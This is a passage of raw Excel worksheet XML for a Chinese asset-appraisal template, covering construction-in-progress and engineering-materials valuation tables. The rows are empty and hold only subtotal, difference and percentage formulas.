      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555">
        <f>SUM(I9:K9)</f>
        <v/>
      </c>
      <c r="M9" s="555" t="n"/>
      <c r="N9" s="555" t="n"/>
      <c r="O9" s="555" t="n"/>
      <c r="P9" s="555">
        <f>SUM(M9:O9)</f>
        <v/>
      </c>
      <c r="Q9" s="555">
        <f>P9-L9</f>
        <v/>
      </c>
      <c r="R9" s="555">
        <f>IF(L9=0,"",Q9/L9*100)</f>
        <v/>
      </c>
      <c r="S9" s="192" t="n"/>
    </row>
    <row r="10" customFormat="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="180" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="381" t="n"/>
      <c r="F10" s="381" t="n"/>
      <c r="G10" s="587" t="n"/>
      <c r="H10" s="587" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555">
        <f>SUM(I10:K10)</f>
        <v/>
      </c>
      <c r="M10" s="555" t="n"/>
      <c r="N10" s="555" t="n"/>
      <c r="O10" s="555" t="n"/>
      <c r="P10" s="555">
        <f>SUM(M10:O10)</f>
        <v/>
      </c>
      <c r="Q10" s="555">
        <f>P10-L10</f>
        <v/>
      </c>
      <c r="R10" s="555">
        <f>IF(L10=0,"",Q10/L10*100)</f>
        <v/>
      </c>
      <c r="S10" s="192" t="n"/>
    </row>
    <row r="11" customFormat="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="381" t="n"/>
      <c r="F11" s="381" t="n"/>
      <c r="G11" s="587" t="n"/>
      <c r="H11" s="587" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555">
        <f>SUM(I11:K11)</f>
        <v/>
      </c>
      <c r="M11" s="555" t="n"/>
      <c r="N11" s="555" t="n"/>
      <c r="O11" s="555" t="n"/>
      <c r="P11" s="555">
        <f>SUM(M11:O11)</f>
        <v/>
      </c>
      <c r="Q11" s="555">
        <f>P11-L11</f>
        <v/>
      </c>
      <c r="R11" s="555">
        <f>IF(L11=0,"",Q11/L11*100)</f>
        <v/>
      </c>
      <c r="S11" s="192" t="n"/>
    </row>
    <row r="12" customFormat="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="381" t="n"/>
      <c r="F12" s="381" t="n"/>
      <c r="G12" s="587" t="n"/>
      <c r="H12" s="587" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555">
        <f>SUM(I12:K12)</f>
        <v/>
      </c>
      <c r="M12" s="555" t="n"/>
      <c r="N12" s="555" t="n"/>
      <c r="O12" s="555" t="n"/>
      <c r="P12" s="555">
        <f>SUM(M12:O12)</f>
        <v/>
      </c>
      <c r="Q12" s="555">
        <f>P12-L12</f>
        <v/>
      </c>
      <c r="R12" s="555">
        <f>IF(L12=0,"",Q12/L12*100)</f>
        <v/>
      </c>
      <c r="S12" s="192" t="n"/>
    </row>
    <row r="13" customFormat="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="381" t="n"/>
      <c r="F13" s="381" t="n"/>
      <c r="G13" s="587" t="n"/>
      <c r="H13" s="587" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555">
        <f>SUM(I13:K13)</f>
        <v/>
      </c>
      <c r="M13" s="555" t="n"/>
      <c r="N13" s="555" t="n"/>
      <c r="O13" s="555" t="n"/>
      <c r="P13" s="555">
        <f>SUM(M13:O13)</f>
        <v/>
      </c>
      <c r="Q13" s="555">
        <f>P13-L13</f>
        <v/>
      </c>
      <c r="R13" s="555">
        <f>IF(L13=0,"",Q13/L13*100)</f>
        <v/>
      </c>
      <c r="S13" s="192" t="n"/>
    </row>
    <row r="14" customFormat="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="381" t="n"/>
      <c r="F14" s="381" t="n"/>
      <c r="G14" s="587" t="n"/>
      <c r="H14" s="587" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555" t="n"/>
      <c r="M14" s="555" t="n"/>
      <c r="N14" s="555" t="n"/>
      <c r="O14" s="555" t="n"/>
      <c r="P14" s="555">
        <f>SUM(M14:O14)</f>
        <v/>
      </c>
      <c r="Q14" s="555">
        <f>P14-L14</f>
        <v/>
      </c>
      <c r="R14" s="555">
        <f>IF(L14=0,"",Q14/L14*100)</f>
        <v/>
      </c>
      <c r="S14" s="192" t="n"/>
    </row>
    <row r="15" customFormat="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="381" t="n"/>
      <c r="F15" s="381" t="n"/>
      <c r="G15" s="587" t="n"/>
      <c r="H15" s="587" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555">
        <f>SUM(I15:K15)</f>
        <v/>
      </c>
      <c r="M15" s="555" t="n"/>
      <c r="N15" s="555" t="n"/>
      <c r="O15" s="555" t="n"/>
      <c r="P15" s="555">
        <f>SUM(M15:O15)</f>
        <v/>
      </c>
      <c r="Q15" s="555">
        <f>P15-L15</f>
        <v/>
      </c>
      <c r="R15" s="555">
        <f>IF(L15=0,"",Q15/L15*100)</f>
        <v/>
      </c>
      <c r="S15" s="192" t="n"/>
    </row>
    <row r="16" customFormat="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="381" t="n"/>
      <c r="F16" s="381" t="n"/>
      <c r="G16" s="587" t="n"/>
      <c r="H16" s="587" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555">
        <f>SUM(I16:K16)</f>
        <v/>
      </c>
      <c r="M16" s="555" t="n"/>
      <c r="N16" s="555" t="n"/>
      <c r="O16" s="555" t="n"/>
      <c r="P16" s="555">
        <f>SUM(M16:O16)</f>
        <v/>
      </c>
      <c r="Q16" s="555">
        <f>P16-L16</f>
        <v/>
      </c>
      <c r="R16" s="555">
        <f>IF(L16=0,"",Q16/L16*100)</f>
        <v/>
      </c>
      <c r="S16" s="192" t="n"/>
    </row>
    <row r="17" customFormat="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="381" t="n"/>
      <c r="F17" s="381" t="n"/>
      <c r="G17" s="587" t="n"/>
      <c r="H17" s="587" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555">
        <f>SUM(I17:K17)</f>
        <v/>
      </c>
      <c r="M17" s="555" t="n"/>
      <c r="N17" s="555" t="n"/>
      <c r="O17" s="555" t="n"/>
      <c r="P17" s="555">
        <f>SUM(M17:O17)</f>
        <v/>
      </c>
      <c r="Q17" s="555">
        <f>P17-L17</f>
        <v/>
      </c>
      <c r="R17" s="555">
        <f>IF(L17=0,"",Q17/L17*100)</f>
        <v/>
      </c>
      <c r="S17" s="192" t="n"/>
    </row>
    <row r="18" customFormat="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="381" t="n"/>
      <c r="F18" s="381" t="n"/>
      <c r="G18" s="587" t="n"/>
      <c r="H18" s="587" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555">
        <f>SUM(I18:K18)</f>
        <v/>
      </c>
      <c r="M18" s="555" t="n"/>
      <c r="N18" s="555" t="n"/>
      <c r="O18" s="555" t="n"/>
      <c r="P18" s="555">
        <f>SUM(M18:O18)</f>
        <v/>
      </c>
      <c r="Q18" s="555">
        <f>P18-L18</f>
        <v/>
      </c>
      <c r="R18" s="555">
        <f>IF(L18=0,"",Q18/L18*100)</f>
        <v/>
      </c>
      <c r="S18" s="192" t="n"/>
    </row>
    <row r="19" customFormat="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="381" t="n"/>
      <c r="F19" s="381" t="n"/>
      <c r="G19" s="587" t="n"/>
      <c r="H19" s="587" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555">
        <f>SUM(I19:K19)</f>
        <v/>
      </c>
      <c r="M19" s="555" t="n"/>
      <c r="N19" s="555" t="n"/>
      <c r="O19" s="555" t="n"/>
      <c r="P19" s="555">
        <f>SUM(M19:O19)</f>
        <v/>
      </c>
      <c r="Q19" s="555">
        <f>P19-L19</f>
        <v/>
      </c>
      <c r="R19" s="555">
        <f>IF(L19=0,"",Q19/L19*100)</f>
        <v/>
      </c>
      <c r="S19" s="192" t="n"/>
    </row>
    <row r="20" customFormat="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="381" t="n"/>
      <c r="F20" s="381" t="n"/>
      <c r="G20" s="587" t="n"/>
      <c r="H20" s="587" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555">
        <f>SUM(I20:K20)</f>
        <v/>
      </c>
      <c r="M20" s="555" t="n"/>
      <c r="N20" s="555" t="n"/>
      <c r="O20" s="555" t="n"/>
      <c r="P20" s="555">
        <f>SUM(M20:O20)</f>
        <v/>
      </c>
      <c r="Q20" s="555">
        <f>P20-L20</f>
        <v/>
      </c>
      <c r="R20" s="555">
        <f>IF(L20=0,"",Q20/L20*100)</f>
        <v/>
      </c>
      <c r="S20" s="192" t="n"/>
    </row>
    <row r="21" customFormat="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="381" t="n"/>
      <c r="F21" s="381" t="n"/>
      <c r="G21" s="587" t="n"/>
      <c r="H21" s="587" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555">
        <f>SUM(I21:K21)</f>
        <v/>
      </c>
      <c r="M21" s="555" t="n"/>
      <c r="N21" s="555" t="n"/>
      <c r="O21" s="555" t="n"/>
      <c r="P21" s="555">
        <f>SUM(M21:O21)</f>
        <v/>
      </c>
      <c r="Q21" s="555">
        <f>P21-L21</f>
        <v/>
      </c>
      <c r="R21" s="555">
        <f>IF(L21=0,"",Q21/L21*100)</f>
        <v/>
      </c>
      <c r="S21" s="192" t="n"/>
    </row>
    <row r="22" customFormat="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="381" t="n"/>
      <c r="F22" s="381" t="n"/>
      <c r="G22" s="587" t="n"/>
      <c r="H22" s="587" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555">
        <f>SUM(I22:K22)</f>
        <v/>
      </c>
      <c r="M22" s="555" t="n"/>
      <c r="N22" s="555" t="n"/>
      <c r="O22" s="555" t="n"/>
      <c r="P22" s="555">
        <f>SUM(M22:O22)</f>
        <v/>
      </c>
      <c r="Q22" s="555">
        <f>P22-L22</f>
        <v/>
      </c>
      <c r="R22" s="555">
        <f>IF(L22=0,"",Q22/L22*100)</f>
        <v/>
      </c>
      <c r="S22" s="192" t="n"/>
    </row>
    <row r="23" customFormat="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="381" t="n"/>
      <c r="F23" s="381" t="n"/>
      <c r="G23" s="587" t="n"/>
      <c r="H23" s="587" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555">
        <f>SUM(I23:K23)</f>
        <v/>
      </c>
      <c r="M23" s="555" t="n"/>
      <c r="N23" s="555" t="n"/>
      <c r="O23" s="555" t="n"/>
      <c r="P23" s="555">
        <f>SUM(M23:O23)</f>
        <v/>
      </c>
      <c r="Q23" s="555">
        <f>P23-L23</f>
        <v/>
      </c>
      <c r="R23" s="555">
        <f>IF(L23=0,"",Q23/L23*100)</f>
        <v/>
      </c>
      <c r="S23" s="192" t="n"/>
    </row>
    <row r="24" customFormat="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="381" t="n"/>
      <c r="F24" s="381" t="n"/>
      <c r="G24" s="587" t="n"/>
      <c r="H24" s="587" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555">
        <f>SUM(I24:K24)</f>
        <v/>
      </c>
      <c r="M24" s="555" t="n"/>
      <c r="N24" s="555" t="n"/>
      <c r="O24" s="555" t="n"/>
      <c r="P24" s="555">
        <f>SUM(M24:O24)</f>
        <v/>
      </c>
      <c r="Q24" s="555">
        <f>P24-L24</f>
        <v/>
      </c>
      <c r="R24" s="555">
        <f>IF(L24=0,"",Q24/L24*100)</f>
        <v/>
      </c>
      <c r="S24" s="192" t="n"/>
    </row>
    <row r="25" customFormat="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="381" t="n"/>
      <c r="F25" s="381" t="n"/>
      <c r="G25" s="587" t="n"/>
      <c r="H25" s="587" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555">
        <f>SUM(I25:K25)</f>
        <v/>
      </c>
      <c r="M25" s="555" t="n"/>
      <c r="N25" s="555" t="n"/>
      <c r="O25" s="555" t="n"/>
      <c r="P25" s="555">
        <f>SUM(M25:O25)</f>
        <v/>
      </c>
      <c r="Q25" s="555">
        <f>P25-L25</f>
        <v/>
      </c>
      <c r="R25" s="555">
        <f>IF(L25=0,"",Q25/L25*100)</f>
        <v/>
      </c>
      <c r="S25" s="192" t="n"/>
    </row>
    <row r="26" customFormat="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="381" t="n"/>
      <c r="E26" s="381" t="n"/>
      <c r="F26" s="381" t="n"/>
      <c r="G26" s="587" t="n"/>
      <c r="H26" s="587" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555">
        <f>SUM(I26:K26)</f>
        <v/>
      </c>
      <c r="M26" s="555" t="n"/>
      <c r="N26" s="555" t="n"/>
      <c r="O26" s="555" t="n"/>
      <c r="P26" s="555">
        <f>SUM(M26:O26)</f>
        <v/>
      </c>
      <c r="Q26" s="555">
        <f>P26-L26</f>
        <v/>
      </c>
      <c r="R26" s="555">
        <f>IF(L26=0,"",Q26/L26*100)</f>
        <v/>
      </c>
      <c r="S26" s="192" t="n"/>
    </row>
    <row r="27" customFormat="1" s="116">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="284" t="inlineStr">
        <is>
          <t>合      计</t>
        </is>
      </c>
      <c r="C27" s="593" t="n"/>
      <c r="D27" s="567" t="n"/>
      <c r="E27" s="565" t="n"/>
      <c r="F27" s="565" t="n"/>
      <c r="G27" s="565" t="inlineStr"/>
      <c r="H27" s="383" t="n"/>
      <c r="I27" s="555">
        <f>SUM(I7:I26)</f>
        <v/>
      </c>
      <c r="J27" s="555">
        <f>SUM(J7:J26)</f>
        <v/>
      </c>
      <c r="K27" s="555">
        <f>SUM(K7:K26)</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>SUM(L7:L26)</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>SUM(M7:M26)</f>
        <v/>
      </c>
      <c r="N27" s="555">
        <f>SUM(N7:N26)</f>
        <v/>
      </c>
      <c r="O27" s="555">
        <f>SUM(O7:O26)</f>
        <v/>
      </c>
      <c r="P27" s="555">
        <f>SUM(P7:P26)</f>
        <v/>
      </c>
      <c r="Q27" s="555">
        <f>P27-L27</f>
        <v/>
      </c>
      <c r="R27" s="555">
        <f>IF(L27=0,"",Q27/L27*100)</f>
        <v/>
      </c>
      <c r="S27" s="192" t="n"/>
    </row>
    <row r="28" customFormat="1" s="116">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B28" s="284" t="inlineStr">
        <is>
          <t>减：在建设备安装工程减值准备</t>
        </is>
      </c>
      <c r="C28" s="593" t="n"/>
      <c r="D28" s="567" t="n"/>
      <c r="E28" s="565" t="n"/>
      <c r="F28" s="565" t="n"/>
      <c r="G28" s="565" t="inlineStr"/>
      <c r="H28" s="383" t="n"/>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555" t="n"/>
      <c r="L28" s="555" t="n"/>
      <c r="M28" s="555" t="n"/>
      <c r="N28" s="555" t="n"/>
      <c r="O28" s="555" t="n"/>
      <c r="P28" s="555" t="n"/>
      <c r="Q28" s="555">
        <f>P28-L28</f>
        <v/>
      </c>
      <c r="R28" s="555">
        <f>IF(L28=0,"",Q28/L28*100)</f>
        <v/>
      </c>
      <c r="S28" s="192" t="n"/>
    </row>
    <row r="29" customFormat="1" s="116">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B29" s="284" t="inlineStr">
        <is>
          <t>合      计</t>
        </is>
      </c>
      <c r="C29" s="593" t="n"/>
      <c r="D29" s="567" t="n"/>
      <c r="E29" s="565" t="n"/>
      <c r="F29" s="565" t="n"/>
      <c r="G29" s="565" t="inlineStr"/>
      <c r="H29" s="383" t="n"/>
      <c r="I29" s="555">
        <f>I27-I28</f>
        <v/>
      </c>
      <c r="J29" s="555">
        <f>J27-J28</f>
        <v/>
      </c>
      <c r="K29" s="555">
        <f>K27-K28</f>
        <v/>
      </c>
      <c r="L29" s="555">
        <f>L27-L28</f>
        <v/>
      </c>
      <c r="M29" s="555">
        <f>M27-M28</f>
        <v/>
      </c>
      <c r="N29" s="555">
        <f>N27-N28</f>
        <v/>
      </c>
      <c r="O29" s="555">
        <f>O27-O28</f>
        <v/>
      </c>
      <c r="P29" s="555">
        <f>P27-P28</f>
        <v/>
      </c>
      <c r="Q29" s="555">
        <f>P29-L29</f>
        <v/>
      </c>
      <c r="R29" s="555">
        <f>IF(L29=0,"",Q29/L29*100)</f>
        <v/>
      </c>
      <c r="S29" s="192" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="17">
    <mergeCell ref="M5:P5"/>
    <mergeCell ref="B28:D28"/>
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="G5:G6"/>
    <mergeCell ref="H5:H6"/>
    <mergeCell ref="Q5:Q6"/>
    <mergeCell ref="R5:R6"/>
    <mergeCell ref="S5:S6"/>
    <mergeCell ref="B2:S2"/>
    <mergeCell ref="B27:D27"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="F5:F6"/>
    <mergeCell ref="B29:D29"/>
    <mergeCell ref="B1:S1"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="I5:L5"/>
    <mergeCell ref="D5:D6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:S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67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 codeName="Sheet66">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:N29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A7" sqref="A7:A26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="7.5" customWidth="1" style="410" min="2" max="2"/>
    <col width="18.6666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="9" customWidth="1" style="410" min="4" max="4"/>
    <col width="6.66666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="9.16666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="8.16666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="9.83333333333333" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="9" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="11" max="12"/>
    <col outlineLevel="1" width="8.5" customWidth="1" style="410" min="13" max="13"/>
    <col width="8.16666666666667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在建工程—工程物资评估明细表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402" t="inlineStr">
        <is>
          <t>表4-9-3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54" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="376" t="n"/>
      <c r="M4" s="376" t="n"/>
      <c r="N4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="369">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头1</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>工程项目</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>计量
单位</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="G5" s="593" t="n"/>
      <c r="H5" s="567" t="n"/>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="J5" s="593" t="n"/>
      <c r="K5" s="567" t="n"/>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>增值率
%</t>
        </is>
      </c>
      <c r="N5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="369">
      <c r="A6" s="116" t="inlineStr">
        <is>
          <t>检索表头2</t>
        </is>
      </c>
      <c r="B6" s="594" t="n"/>
      <c r="C6" s="594" t="n"/>
      <c r="D6" s="594" t="n"/>
      <c r="E6" s="594" t="n"/>
      <c r="F6" s="380" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="G6" s="380" t="inlineStr">
        <is>
          <t>单价</t>
        </is>
      </c>
      <c r="H6" s="380" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="I6" s="613" t="inlineStr">
        <is>
          <t>实际数量</t>
        </is>
      </c>
      <c r="J6" s="380" t="inlineStr">
        <is>
          <t>单价</t>
        </is>
      </c>
      <c r="K6" s="380" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="L6" s="594" t="n"/>
      <c r="M6" s="594" t="n"/>
      <c r="N6" s="594" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="381" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555">
        <f>K7-H7</f>
        <v/>
      </c>
      <c r="M7" s="555">
        <f>IF(H7=0,"",L7/H7*100)</f>
        <v/>
      </c>
      <c r="N7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555">
        <f>K8-H8</f>
        <v/>
      </c>
      <c r="M8" s="555">
        <f>IF(H8=0,"",L8/H8*100)</f>
        <v/>
      </c>
      <c r="N8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555">
        <f>K9-H9</f>
        <v/>
      </c>
      <c r="M9" s="555">
        <f>IF(H9=0,"",L9/H9*100)</f>
        <v/>
      </c>
      <c r="N9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555">
        <f>K10-H10</f>
        <v/>
      </c>
      <c r="M10" s="555">
        <f>IF(H10=0,"",L10/H10*100)</f>
        <v/>
      </c>
      <c r="N10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555">
        <f>K11-H11</f>
        <v/>
      </c>
      <c r="M11" s="555">
        <f>IF(H11=0,"",L11/H11*100)</f>
        <v/>
      </c>
      <c r="N11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555">
        <f>K12-H12</f>
        <v/>
      </c>
      <c r="M12" s="555">
        <f>IF(H12=0,"",L12/H12*100)</f>
        <v/>
      </c>
      <c r="N12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
